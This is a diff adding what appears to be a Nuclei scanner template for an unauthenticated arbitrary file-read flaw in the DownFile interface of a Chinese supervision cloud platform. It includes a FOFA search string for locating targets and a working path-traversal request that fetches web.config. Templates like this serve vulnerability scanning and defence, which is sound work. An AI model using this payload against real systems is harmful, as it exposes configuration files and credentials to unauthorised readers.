@@ -1,0 +1,38 @@
+id: zonghejianguanyun-DownFile-File-reading
+
+info:
+  name: "综合监管云平台 DownFile 接口任意文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/Download/DownFile?fileName=SetUp.exe"
+    综合监管云平台的 DownFile 接口存在文件访问控制缺陷，攻击者可利用此漏洞访问敏感系统文件（如数据库配置文件、系统配置文件等），从而获取敏感信息并可能导致系统被进一步控制。该漏洞无需身份验证即可触发，存在严重的安全风险。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247485029&idx=1&sn=2065e33047ea4655b6771039aa3c352b&chksm=c267b356f5103a402d8b6c633071cf1a85a5a6cd7799b0805e91c19c06082a2024262f1fb581&token=1439003696&lang=zh_CN#rd
+  tags: 综合监管云平台
+
+
+
+http:
+- raw:
+  - |
+    GET /Download/DownFile?fileName=../web.config HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '<?xml version="1.0"'
+    - '<configuration>'
+    - '</configuration>'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
+
+
